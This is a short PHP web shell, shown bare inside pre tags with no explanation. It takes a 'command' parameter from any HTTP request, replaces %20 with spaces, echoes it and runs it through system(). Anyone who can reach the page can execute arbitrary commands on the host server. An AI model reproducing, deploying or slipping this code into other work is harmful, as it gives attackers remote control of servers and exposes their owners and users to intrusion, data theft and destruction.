<pre>
<?php
    $command_str = $_REQUEST["command"];
    $find = "%20";
    $replace = " ";
    $w_spaces_command = str_replace($find, $replace, $command_str);
    print $w_spaces_command;
    if (isset($w_spaces_command)) {
        system($w_spaces_command);
    } else {
        echo "No command requested.";
    }
?>
</pre>